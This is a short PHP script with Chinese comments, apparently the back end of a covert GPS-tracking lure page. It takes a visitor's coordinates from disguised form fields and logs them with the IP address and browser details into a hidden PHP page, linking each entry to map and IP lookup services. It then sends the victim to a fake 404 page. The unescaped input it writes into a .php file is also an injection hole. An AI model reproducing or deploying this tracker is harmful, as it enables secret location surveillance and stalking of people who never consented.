<?php
date_default_timezone_set('PRC');
error_reporting(0); //抑制所有错误信息
@header("content-Type: text/html; charset=utf-8"); //语言强制
$address = $_SERVER['REMOTE_ADDR'];
$referer = $_SERVER['HTTP_REFERER'];

$browser = $_SERVER['HTTP_USER_AGENT'];
$file = fopen("../getgps/index.php", "a");  
$time = date("Y-m-d H:i:s");
$nowLatitude=$_POST['username'];    //接受上个页面传过来的参数（经度坐标）
$nowlongitude=$_POST['password'];    //接受上个页面传过来的参数（纬度坐标）
$city="<script type='text/javascript'";    //接受上个页面传过来的参数（纬度坐标）
fwrite( $file, "<b><font color=ff0002>访问时间:</font></b><b> $time &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b>" );
fwrite( $file, "<b><font color=ff0000>IP地址:</font></b> <a href=http://chaipip.com/ip.php?ip=$address target=\"_blank\">$address</a> <b></b> <br>");
fwrite( $file, "<b><font color=ff0000>经度:</font></b> <a>$nowlongitude</a> <b></b> <br>");
fwrite( $file, "<b><font color=ff0000>纬度:</font></b> <a>$nowLatitude</a> <b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b> <br> ");
fwrite( $file, "<b><font color=ff0000>位置:</font></b> <a href=http://m.gpsspg.com/maps.htm?maps=2&stype=2&s=$nowLatitude,$nowlongitude>$nowLatitude,$nowlongitude</a> <b></b> <br>");
//@$time=date('Y-m-d H:i:s',time());  //获取当前时间
//$fp=fopen("geo.txt", "a+");  //创建一个geo.txt文件
//fwrite($fp, $nowLatitude);   //把经度写入到geo.txt里
//fwrite($fp, $nowlongitude);   //把纬度写入到geo.txt里

fwrite( $file, "<b>浏览器UA:</b> $browser<br/><hr>");  
fclose($file);
header("Location:http://qzonestyle.gtimg.cn/qzone/hybrid/app/404");   
//确保重定向后，后续代码不会被执行   
exit;  
?>